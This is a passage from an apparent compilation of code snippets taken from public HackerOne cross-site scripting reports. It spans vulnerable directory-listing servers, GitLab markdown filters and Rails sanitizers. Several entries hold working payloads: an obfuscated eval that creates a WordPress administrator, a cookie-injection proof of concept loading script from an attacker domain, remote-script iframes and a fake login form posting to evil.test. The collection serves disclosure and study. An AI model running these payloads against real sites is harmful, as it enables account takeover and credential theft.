                lis+=`<li><a href="${req.url}${v}/">${v}/</a></li>`;
            }else {
                lis+=`<li><a href="${req.url}${v}">${v}</a></li>`
            }
        });

        (...)
```

## 433. [#935503](https://hackerone.com/reports/935503)  -  Reflected XSS on cz.acronis.com/dekujeme-za-odber-novinek-produktu-disk-director with ability to creating an admin user in WordPress
*medium*

```
eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,115,105,116,101,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))
# … truncated …
```

## 434. [#691977](https://hackerone.com/reports/691977)  -  [reveal.js] XSS by calling arbitrary method via postMessage
*medium*

```javascript
function setupPostMessage() {
	
	if( config.postMessage ) {
		window.addEventListener( 'message', function ( event ) {
			var data = event.data;
			
			// Make sure we're dealing with JSON
			if( typeof data === 'string' && data.charAt( 0 ) === '{' && data.charAt( data.length - 1 ) === '}' ) {
				data = JSON.parse( data );

				// Check if the requested method can be found
				if( data.method && typeof Reveal[data.method] === 'function' ) {
					Reveal[data.method].apply( Reveal, data.args );
				}
			}
		}, false );
	}
}
```

## 435. [#329950](https://hackerone.com/reports/329950)  -  [public] Stored XSS in the filename when directories listing
*medium*

```
files.forEach(function(file) {
    list.push('<li><a href="', path.join(base, file),'">', file, '</a></li>');
});
```

## 436. [#319794](https://hackerone.com/reports/319794)  -  [m-server] HTML Injection in filenames displayed as directory listing in the browser allows to embed iframe with malicious JavaScript code
*medium*

```javascript
// node_modules/m-server/lib/utils.js, line 57

    dirs.sort(sort).forEach(function (val) {
        html.push('<li><a href="' + path + '/' + val + '">' + val + '</a></li>');
    });
    files.sort(sort).forEach(function (val) {
        html.push('<li><a download href="' + path + '/' + val + '">' + val + '</a></li>');
    });
    html.push('</ul>');
    return html.join('');
```

## 437. [#319794](https://hackerone.com/reports/319794)  -  [m-server] HTML Injection in filenames displayed as directory listing in the browser allows to embed iframe with malicious JavaScript code
*medium*

```javascript
const escapeHtml = require('escape-html')

(...)

// vulnerable part of node_modules/m-server/lib/utils.js:
dirs.sort(sort).forEach(function (val) {
    html.push('<li><a href="' + path + '/' + escape(val) + '">' + escape(val) + '</a></li>');
});
files.sort(sort).forEach(function (val) {
    html.push('<li><a download href="' + path + '/' + escape(val) + '">' + escape(val) + '</a></li>');
});
html.push('</ul>');
return html.join('');
```

## 438. [#1731349](https://hackerone.com/reports/1731349)  -  Stored XSS via Kroki diagram
*high, $13,950*

```bash
$ sudo gitlab-rake gitlab:env:info

System information
System:		Ubuntu 20.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.6p219
Gem Version:	3.1.6
Bundler Version:2.3.15
Rake Version:	13.0.6
Redis Version:	6.2.7
Sidekiq Version:6.5.7
Go Version:	unknown

GitLab information
Version:	15.6.2-ee
Revision:	08b668e8740
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.12
URL:		http://gitlab.wbowling.info
HTTP Clone URL:	http://gitlab.wbowling.info/some-group/some-project.git
SSH Clone URL:	git@gitlab.wbowling.info:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.13.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
```

## 439. [#534450](https://hackerone.com/reports/534450)  -  Account takeover through the combination of cookie manipulation and XSS
*high*

```html
<html>

<head>
<title>Grammarly POC</title>
<meta charset="utf-8"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>

<body>
<script>

    var cookie_hax = {
        "gnar_containerId":"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr"+"ipt><noscript>",
    };

    for (var name in cookie_hax) {
        $.ajax({
            type: "POST",
            url: "https://gnar.grammarly.com/cookies?name=" + name + "&value=" + encodeURIComponent(cookie_hax[name]) + "&maxAge=2147483647",
            cache: false,
            xhrFields: {
                withCredentials: true
            },
            crossDomain: true,
            async: false,
        });
    }

    window.location.replace("https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal");

</script>
</body>

</html>
```

## 440. [#1392262](https://hackerone.com/reports/1392262)  -  Stored XSS via LINK Name.
*high*

```html
<script> tag and execute the XSS.

See Proof Of Concept below.
Thank You.

---

## Steps To Reproduce:

A. Log into your account at `https://marketing.na1.insightly.com/`

B. Click on `Plus Sign` --> `Add a new redirect Link` 

C. Enter this `'"></script>
```

## 441. [#1212067](https://hackerone.com/reports/1212067)  -  Stored XSS in markdown via the DesignReferenceFilter
*critical, $16,000*

```ruby
def self.link_reference_pattern
      @link_reference_pattern ||= begin
        path_segment = %r{issues/#{Gitlab::Regex.issue}/designs}
        ext = Regexp.new(Regexp.union(SAFE_IMAGE_EXT + DANGEROUS_IMAGE_EXT).source, Regexp::IGNORECASE)
        valid_char = %r{[^/\s]} # any char that is not a forward slash or whitespace
        filename_pattern = %r{
          (?<url_filename> #{valid_char}+ \. #{ext})
        }x

        super(path_segment, filename_pattern)
      end
    end
```

## 442. [#1212067](https://hackerone.com/reports/1212067)  -  Stored XSS in markdown via the DesignReferenceFilter
*critical, $16,000*

```ruby
def redacted_node_content(node)
  original_content = node.attr('data-original')
  link_reference = node.attr('data-link-reference')

  # Build the raw <a> tag just with a link as href and content if
  # it's originally a link pattern. We shouldn't return a plain text href.
  original_link =
    if link_reference == 'true'
      href = node.attr('href')
      content = original_content

      %(<a href="#{href}">#{content}</a>)
    end
```

## 443. [#1212067](https://hackerone.com/reports/1212067)  -  Stored XSS in markdown via the DesignReferenceFilter
*critical, $16,000*

```html
<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' data-design="1" data-issue="1" data-reference-type="design" data-original="
  &lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>
"
</a>
```

## 444. [#309648](https://hackerone.com/reports/309648)  -  [simplehttpserver] Stored XSS in file names leads to malicious JavaScript code execution when directory listing is output in HTML
*critical*

```bash
$ ./node_modules/simplehttpserver/cli.js
Listening 0.0.0.0:8000 web root dir /Users/bl4de/playground/node_bugbounty_playground
```

## 445. [#309367](https://hackerone.com/reports/309367)  -  [metascraper] Stored XSS in Open Graph meta properties read by metascrapper
*critical*

```bash
$ npm install metascrapper got express
```

## 446. [#309367](https://hackerone.com/reports/309367)  -  [metascraper] Stored XSS in Open Graph meta properties read by metascrapper
*critical*

```bash
$ node app.js
```

## 447. [#309394](https://hackerone.com/reports/309394)  -  [anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere
*critical*

```
"><iframe src="malware_frame.html">
```

## 448. [#309394](https://hackerone.com/reports/309394)  -  [anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere
*critical*

```bash
$ ./node_modules/anywhere/bin/anywhere -p 8080
Running at http://192.168.1.1:8080/
Also running at https://192.168.1.1:8081/
```

## 449. [#311101](https://hackerone.com/reports/311101)  -  [crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server
*critical*

```bash
$ ./node_modules/crud-file-server/bin/crud-file-server -f ./ -p 8080

usage:
  crud-file-server [options]

this starts a file server using the specified command-line options

options:

  -f file system path to expose over http
  -h log head requests
  -p port to listen on (example, 80)
  -q suppress this message
  -r read only
  -v virtual path to host the file server on

example:

  crud-file-server -f c:/ -p 8080 -q -v filez

listening on :8080/, serving ./
```

## 450. [#986386](https://hackerone.com/reports/986386)  -  Reflected XSS on www.hackerone.com via Wistia embed code
*low, $500*

```javascript
i._initializers.initWLog = function() {
    var e, t, n, o, a, l, s, d, u, p, c;
    if (t = i.url.parse(location.href),
    document.referrer && (u = i.url.parse(document.referrer)),
```

## 451. [#398054](https://hackerone.com/reports/398054)  -  DOM Based XSS in www.hackerone.com via PostMessage
*low, $500*

```javascript
var success = function (data){
  if(data.error){
    onError(data);
  }else if(data.formId){
    var u = findCorrectFollowUpUrl(data);
    if(false === onSuccess(values, u)){
      return;
    }
    cookieHelper.removeCookieAllDomains("_mkto_purl");
    location.href = u;
  }
}
```

## 452. [#883867](https://hackerone.com/reports/883867)  -  Inject page in admin panel via Shopify.API.pushState [New Payload]
*low, $500*

```js
const ctx = window.open(location.origin+'/admin/themes', '_blank')
const data = JSON.stringify({
                  message: 'Shopify.API.replaceState',
                  data: {pathname: "abc:d../pages/xss#//"}
});
ctx.postMessage(data)
```

## 453. [#500436](https://hackerone.com/reports/500436)  -  DOM based CSS Injection on grammarly.com
*low, $250*

```javascript
t.prototype.componentWillMount = function () {
        var e = this.getCtx().nav.waypoint.query,
        t = e.extcss,
        n = e.affParams,
        a = e.minWords;
        this.affParams = n ? JSON.parse(decodeURIComponent(n))  : {
        },
        this.minWords = parseInt(a, 10),
        t && this.addExternalCss(t)
      },
      t.prototype.addExternalCss = function (e) {
        var t = document.createElement('link');
        t.setAttribute('href', e),
        t.setAttribute('rel', 'stylesheet'),
        t.setAttribute('type', 'text/css'),
        document.head.appendChild(t)
      },
```

## 454. [#1031644](https://hackerone.com/reports/1031644)  -  DOM XSS on http://talks.lystit.com
*low, $100*

```javascript
window.addEventListener('message', function(event) {
    var data = JSON.parse(event.data);

    // No need for updating the notes in case of fragment changes
    if (data.notes !== undefined) {
        if (data.markdown) {
            notes.innerHTML = marked(data.notes);
        } else {
            notes.innerHTML = data.notes;
        }
    }

    silenced = true;

    // Update the note slides
    currentSlide.contentWindow.Reveal.slide(data.indexh, data.indexv, data.indexf);
    nextSlide.contentWindow.Reveal.slide(data.nextindexh, data.nextindexv);

    silenced = false;

}, false);
```

## 455. [#2303609](https://hackerone.com/reports/2303609)  -  XSS when using `translate` in Action Controller (Rails 7.0, 7.1)
*low*

```
❯ ruby -v
ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]

❯ rails new rails_server -G -M -O -C -A -J -T 
# Rails 7.1.2

❯ cd rails_server
```

## 456. [#2303609](https://hackerone.com/reports/2303609)  -  XSS when using `translate` in Action Controller (Rails 7.0, 7.1)
*low*

```ruby
class ArticlesController < ApplicationController

  def missing_key  
    @message = t(params[:text])
    render :show
  end

  def default  
    @message = t("message_html", default: "<script>alert(location)</script>")
    render :show
  end
end
```

## 457. [#406587](https://hackerone.com/reports/406587)  -  Self DOM-Based XSS in www.hackerone.com
*low*

```javascript
//Marketo Form Code
function strip(html) {
    var tmp = document.createElement("DIV");
    tmp.innerHTML = html;
    return tmp.textContent || tmp.innerText || "";
}

$('form').submit(function() {
    $('textarea').val(function() {
        return strip($(this).val());
    });
});
```

## 458. [#404126](https://hackerone.com/reports/404126)  -  [buttle] Unsafe rendering of Markdown files
*low*

```js
// line no 8
  var md = require('kramed');
  md.setOptions({
    gfm: true
  });

return function(req, res, next) {
    var url = req.url;
    if(/\.md$/i.test(url) || /\.markdown/i.test(url)) {
      fs.exists(j(dir, url), function(exists) {
        if(exists) {
          fs.readFile(j(dir, url), {encoding: 'utf8'}, function(err, data) {
            if(err) { return res.end(err.message); }
            res.end(wrapInHtml(md(data)));
          });
        } else {
          next();
        }
      });
    } else {
      next();
    }
  };
```

## 459. [#316346](https://hackerone.com/reports/316346)  -  [public] Stored XSS in filenames in directory served by public
*low*

```javascript
// node_modules/public/bin/public, line 106:
        files.forEach(function(file) {
            list.push('<li><a href="', path.join(base, file),'">', file, '</a></li>');
        });
```

## 460. [#1198517](https://hackerone.com/reports/1198517)  -  Stored XSS in custom emoji
*high, $3,000*

```ruby
def emoji_image_tag(name, src)
      "<img class='emoji' title=':#{name}:' alt=':#{name}:' src='#{src}' height='20' width='20' align='absmiddle' />"
    end

    ...

    def custom_emoji_tag(name, image_source)
      data = {
        name: name
      }

      ActionController::Base.helpers.content_tag('gl-emoji', title: name, data: data) do
        emoji_image_tag(name, image_source).html_safe
      end
    end
```

## 461. [#1280002](https://hackerone.com/reports/1280002)  -  Stored XSS via Mermaid Prototype Pollution vulnerability
*high, $3,000*

```
%%{init: { '__proto__': {'template': '<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\">'}} }%%
%%{init: { '__proto__': {'template': '<iframe xmlns=\"http://www.w3.org/1999/xhtml\" srcdoc=\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\">'}} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

## 462. [#1398305](https://hackerone.com/reports/1398305)  -  Stored XSS on issue comments and other pages which contain notes
*high, $3,000*

```ruby
def highlight_node(node)
...
sourcepos = node.parent.attr('data-sourcepos')
...
sourcepos_attr = sourcepos ? "data-sourcepos=\"#{sourcepos}\"" : ""

 highlighted = %(<pre #{sourcepos_attr} class="#{css_classes}"
                             lang="#{language}"
                             #{lang_params}
                             v-pre="true"><code>#{code}</code></pre>)
```

## 463. [#3608199](https://hackerone.com/reports/3608199)  -  DOM XSS in `fizzy.do` import filename preview enables one-click victim account takeover
*high, $500*

```bash
docker run -d --name fizzy-mailhog-bridge mailhog/mailhog

docker run -d --name fizzy-ato-poc \
  -e SECRET_KEY_BASE="$(openssl rand -hex 32)" \
  -e DISABLE_SSL=true \
  -e MULTI_TENANT=true \
  -e SMTP_ADDRESS=172.17.0.6 \
  -e SMTP_PORT=1025 \
  -e SMTP_USERNAME=test \
  -e SMTP_PASSWORD=test \
  -e SMTP_AUTHENTICATION=plain \
  -e BASE_URL=http://172.17.0.7:3000 \
  fizzy-main-latest \
  bash -lc './bin/rails db:prepare && ./bin/rails server -b 0.0.0.0 -p 3000'
```

## 464. [#1542510](https://hackerone.com/reports/1542510)  -  XSS in ZenTao integration affecting self hosted instances without strict CSP
*high*

```json
{
    "issue": {
        "id": "story-1",
        "title": "story",
        "labels": [ ],
        "pri": 3,
        "openedDate": "2021-08-10T08:25:18Z",
        "openedBy": {
            "id": 1,
            "account": "admin",
            "realname": "admin",
            "avatar": "https://www.gravatar.com/avatar/21232f297a57a5a743894a0e4a801fc3?d=identicon&s=80",
            "url": "https://jihudemo.zentao.net/index.php?m=user&f=profile&userID=1"
        },
        "lastEditedDate": "2021-08-10T08:25:18Z",
        "lastEditedBy": "admin",
        "status": "opened",
        "url": "https://jihudemo.zentao.net/index.php?m=story&f=view&storyID=32",
        "desc": "",
        "assignedTo": [],
        "comments": [ ]
    }
}
```

## 465. [#1212822](https://hackerone.com/reports/1212822)  -  Stored XSS in Mermaid when viewing Markdown files
*high*

```go
// Write http headers about the file
	headers.Set("Content-Length", contentLength)
	headers.Set("Content-Type", detectFileContentType(fileName))
	headers.Set("Content-Disposition", "attachment; filename=\""+escapeQuotes(basename)+"\"")
```

## 466. [#1342009](https://hackerone.com/reports/1342009)  -  Stored XSS in merge request creation page through payload in approval rule name
*high*

```html
<iframe/srcdoc='<script/src=/joaxcar_group/first/-/jobs/1415515489/artifacts/raw/data/alert.js></script>'></iframe>
```

## 467. [#3400506](https://hackerone.com/reports/3400506)  -  Stored XSS in Conversion Statistics via Tracker Name
*high*

```
http://[host]/www/admin/stats-conversions.php?clientid=1
```

## 468. [#317125](https://hackerone.com/reports/317125)  -  [bracket-template] Reflected XSS possible when variable passed via GET parameter is used in template
*high*

```bash
$ npm install bracket-template
```

## 469. [#309641](https://hackerone.com/reports/309641)  -  [simple-server] HTML with iframe element can be used as filename, which might lead to load and execute malicious JavaScript
*high*

```bash
$ ./node_modules/simple-server/bin/simple-server.js ./ 8080
Simple-Server listening to http://:::8080/ with directory /Users/bl4de/playground/node_bugbounty_playground
```

## 470. [#341044](https://hackerone.com/reports/341044)  -  [cloudcmd] Stored XSS in the filename when directories listing
*high*

```bash
$ npm i cloudcmd
```

## 471. [#341044](https://hackerone.com/reports/341044)  -  [cloudcmd] Stored XSS in the filename when directories listing
*high*

```bash
$ ./node_modules/cloudcmd/bin/cloudcmd.js --root .
```

## 472. [#3581911](https://hackerone.com/reports/3581911)  -  Stored XSS on Trix Editor version latest (2.1.16) - Sanitizer Bypass
*low, $337*

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Trix Editor v2.1.16 XSS Demo</title>
    <script src="https://cdn.jsdelivr.net/npm/trix@2.1.16/dist/trix.umd.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/trix@2.1.16/dist/trix.min.css" rel="stylesheet">
</head>
<body>
    <h1>Trix Editor v2.1.16 XSS Demo</h1>

    <!-- 
    The following script simulates rendering user-supplied content that contains the malicious data-trix-attachment with our serialization bypass payload.
  -->
    <script>
        document.write(`copy<figure data-trix-attachment="{&quot;contentType&quot;:&quot;text/html&quot;,&quot;content&quot;:&quot;&lt;img src=\\&quot;x\\&quot; data-trix-serialized-attributes=\\&quot;{&amp;quot;onerror&amp;quot;:&amp;quot;alert('XSS IN v2.1.16')&amp;quot;}\\&quot;&gt;&quot;}"></figure>me`);
    </script>

    <h2>Simulate Backend Save & Render</h2>
    <button onclick="triggerXSS()">Trigger XSS</button>
    <div id="output"></div>

    <script>
        function triggerXSS() {
            // 1. Get the serialized HTML output that Trix generated
            var output = document.querySelector("trix-editor").value;
            console.log("Serialized HTML:", output);

            // 2. Simulate the application rendering this saved output on another page
            var div = document.getElementById("output");
            div.innerHTML = output;
        }
    </script>
</body>
# … truncated …
```

## 473. [#856836](https://hackerone.com/reports/856836)  -  Stored XSS on PyPi simple API endpoint
*medium, $3,000*

```ruby
def package_link(url, required_python, filename)
        "<a href=\"#{url}\" data-requires-python=\"#{required_python}\">#{filename}</a><br>"
      end
```

## 474. [#1599573](https://hackerone.com/reports/1599573)  -  Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag
*medium, $2,400*

```http
puts "------------------------------------------------------------------"
```

## 475. [#1599573](https://hackerone.com/reports/1599573)  -  Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag
*medium, $2,400*

```http
puts "use Rails::Html::SafeListSanitizer.new.sanitize, allow select/style tag"
```

## 476. [#1599573](https://hackerone.com/reports/1599573)  -  Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag
*medium, $2,400*

```http
puts Rails::Html::SafeListSanitizer.new.sanitize(frag, tags: tags)
```

## 477. [#949513](https://hackerone.com/reports/949513)  -  XSS by file (Active Storage `Proxying`)
*medium, $500*

```bash
$ rails new proxy_xss --skip-bundle --skip-webpack-install
$ cd proxy_xss/
```

## 478. [#949513](https://hackerone.com/reports/949513)  -  XSS by file (Active Storage `Proxying`)
*medium, $500*

```bash
$ bundle install
...

$ head Gemfile.lock
GIT
  remote: https://github.com/rails/rails.git
  revision: 11f54e12b992f6c8d29fd9bedd89ac438a928a2f
  branch: master
  specs:
    actioncable (6.1.0.alpha)
      actionpack (= 6.1.0.alpha)
      activesupport (= 6.1.0.alpha)
      nio4r (~> 2.0)
      websocket-driver (>= 0.6.1)
```

## 479. [#949513](https://hackerone.com/reports/949513)  -  XSS by file (Active Storage `Proxying`)
*medium, $500*

```bash
$ bundle exec rails active_storage:install
$ bundle exec rails g resource user name:text
$ bundle exec rails db:migrate
```

## 480. [#949513](https://hackerone.com/reports/949513)  -  XSS by file (Active Storage `Proxying`)
*medium, $500*

```ruby
# controllers/users_controller.rb
class UsersController < ApplicationController

  def new
    @user = User.new
  end

  def create
    user = User.create!(user_params)
    redirect_to "/users/#{user.id}"
  end

  def show
    @user = User.find(params[:id])
  end

  private
    def user_params
      params.require(:user).permit(:name, :image)
    end
end
```

## 481. [#1598347](https://hackerone.com/reports/1598347)  -  Stored XSS on www.hackerone.com due to deleted S3-bucket from old page_widget
*medium*

```bash
$ aws s3api create-bucket --profile frans --bucket vspcode
{
    "Location": "/vspcode"
}

$ echo "alert(document.domain + ':' + location.href);" > vspoverlayrun1.js

$ aws s3 cp vspoverlayrun1.js s3://vspcode/ --acl public-read --profile frans

upload: ./vspoverlayrun1.js to s3://vspcode/vspoverlayrun1.js
```

## 482. [#1598347](https://hackerone.com/reports/1598347)  -  Stored XSS on www.hackerone.com due to deleted S3-bucket from old page_widget
*medium*

```http
posterscale='0.5'
```

## 483. [#2089042](https://hackerone.com/reports/2089042)  -  yelp.com and biz.yelp.com ATO via XSS + Cookie Bridge
*medium*

```http
Getting this URL can obviously be automated, but for this POC we're just getting it manually and giving it as an argument to our POC HTML attack page. The attacker page looks like this:
```

## 484. [#425200](https://hackerone.com/reports/425200)  -  XSS [flow] - on www.paypal.com/paypalme/my/landing (requires user interaction)
*medium*

```
returnUrl={paypal_url}&cancelUrl={paypal_url}
```

## 485. [#3779690](https://hackerone.com/reports/3779690)  -  Stored XSS in Rocket.Chat HTML File Export  -  Unauthenticated Entry via LiveChat
*medium*

```typescript
// Before:
file.push(`<p><strong>${messageObject.username}</strong> (${timestamp}):<br/>`);
file.push(message);

// After:
import { escapeHTML } from '@rocket.chat/string-helpers';
file.push(`<p><strong>${escapeHTML(messageObject.username)}</strong> (${escapeHTML(timestamp)}):<br/>`);
file.push(escapeHTML(message));
```

## 486. [#831962](https://hackerone.com/reports/831962)  -  XSS on Issue reference numbers
*medium*

```xml
<svg id="xss" xmlns="http://www.w3.org/2000/svg">
	<foreignObject>
		<iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc='&lt;script src=https://gitlab.com/yvvdwf/svg-use-xss-firefox/-/jobs/486384886/artifacts/raw/alert.js&gt; &lt;/script&gt;'></iframe>
	</foreignObject>
</svg>
```

## 487. [#3091390](https://hackerone.com/reports/3091390)  -  Reflected Cross-Site Scripting (XSS) in Revive Adserver 5.5.2
*medium*

```
phpAds_registerGlobalUnslashed('keyword', 'client', 'campaign', 'banner', 'zone', 'affiliate', 'compact');
...
if (!isset($compact)) {
    $compact = false;
}
...
$oTpl->assign('compact', $compact);
```

## 488. [#490728](https://hackerone.com/reports/490728)  -  [takeapeek] XSS via HTML tag injection in directory lisiting page
*medium*

```bash
$ npm install -g takeapeek
```

## 489. [#490728](https://hackerone.com/reports/490728)  -  [takeapeek] XSS via HTML tag injection in directory lisiting page
*medium*

```bash
$ takeapeek
takepeek listening at http://localhost:3141
```

## 490. [#665302](https://hackerone.com/reports/665302)  -  [seeftl] Stored XSS when directory listing via filename.
*medium*

```bash
$ seeftl
Running at http://127.0.0.1:8000/
```

## 491. [#605915](https://hackerone.com/reports/605915)  -  Reflected XSS / Markup Injection in `index.php/svg/core/logo/logo` parameter `color`
*medium*

```html
<svg width="256" height="128" version="1.1" viewBox="0 0 256 128" xmlns="http://www.w3.org/2000/svg"><g fill="none" stroke-width="22"><circle cx="40" cy="64" r="26" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://www.w3.org/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle alt="" fill="none"/><circle cx="216" cy="64" r="26" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://www.w3.org/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle alt="" fill="none"/><circle cx="128" cy="64" r="46" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://www.w3.org/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle alt="" fill="none"/></g></svg>
# … truncated …
```

## 492. [#1853061](https://hackerone.com/reports/1853061)  -  XSS via Vuln Rendertron Instance At `██████████.jetblue.com/render/*`
*medium*

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Renderer: ██████████
Strict-Transport-Security: max-age=15724800; includeSubDomains
Via: 1.1 varnish, 1.1 varnish
Accept-Ranges: bytes
Date: Tue, 31 Jan 2023 05:20:05 GMT
Age: 0
X-Served-By: cache-iad-kjyo7100133-IAD, cache-hhn-etou8220066-HHN
X-Cache: MISS, MISS
X-Cache-Hits: 0, 0
X-Timer: S1675142405.512544,VS0,VE1332
Vary: Accept-Encoding
Content-Length: 182

<html><head><base href="https://berkaybasar.github.io/"></head><body><xss onblur="alert(1)" id="x" tabindex="1" style="display:block">test</xss><input value="clickme">
</body></html>
```

## 493. [#753971](https://hackerone.com/reports/753971)  -  [htmr] DOM-based XSS
*medium*

```python
import React from 'react';
import convert from 'htmr';

export default function App() {
  return convert(`<p>Hash: ${window.location.hash}</p>`);
}
```

## 494. [#355458](https://hackerone.com/reports/355458)  -  [statics-server] XSS via injected iframe in file name when statics-server displays directory index in the browser
*medium*

```bash
$ npm install statics-server
```

## 495. [#355458](https://hackerone.com/reports/355458)  -  [statics-server] XSS via injected iframe in file name when statics-server displays directory index in the browser
*medium*

```bash
$ ./node_modules/statics-server/index.js 
服务器已经启动
访问localhost:8080
```

## 496. [#935503](https://hackerone.com/reports/935503)  -  Reflected XSS on cz.acronis.com/dekujeme-za-odber-novinek-produktu-disk-director with ability to creating an admin user in WordPress
*medium*

```
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@site.com&pass1=attacker&pass2=attacker&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

## 497. [#356809](https://hackerone.com/reports/356809)  -  [exceljs] Possible XSS via cell value when worksheet is displayed in browser
*medium*

```bash
$ npm i exceljs
```

## 498. [#319794](https://hackerone.com/reports/319794)  -  [m-server] HTML Injection in filenames displayed as directory listing in the browser allows to embed iframe with malicious JavaScript code
*medium*

```bash
$ npm install m-server
```

## 499. [#319794](https://hackerone.com/reports/319794)  -  [m-server] HTML Injection in filenames displayed as directory listing in the browser allows to embed iframe with malicious JavaScript code
*medium*

```bash
$ ./node_modules/m-server/index.js -p 8080
-------------------------------------------------------------
	Mini http server running on port 8080 !
	You can open the floowing urls to view files.
	127.0.0.1:8080
	10.235.1.22:8080
	10.235.4.26:8080
	Have fun ^_^
-------------------------------------------------------------
```

## 500. [#328210](https://hackerone.com/reports/328210)  -  [sexstatic] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name
*medium*

```bash
$ npm install sexstatic
```

## 501. [#328210](https://hackerone.com/reports/328210)  -  [sexstatic] HTML injection in directory name(s) leads to Stored XSS when malicious file is embed with <iframe> element used in directory name
*medium*

```bash
$ ./node_modules/sexstatic/lib/sexstatic.js -p 8080
sexstatic serving /home/rafal.janicki/playground/hackerone/Node at http://0.0.0.0:8080
```

## 502. [#694930](https://hackerone.com/reports/694930)  -  [snekserve] Stored XSS via filenames HTML formatted
*medium*

```bash
npm i snekserve -g # Installs the CLI version of the module
mkdir '<iframe src=..\malicious.html>' # Creates the malicious *HTML formatted* folder
snekserve # Starts the server
# Open a browser and go on http://localhost:8080
```

## 503. [#331110](https://hackerone.com/reports/331110)  -  [buttle] HTML Injection in filename leads to XSS when directory listing is displayed in the browser
*medium*

```bash
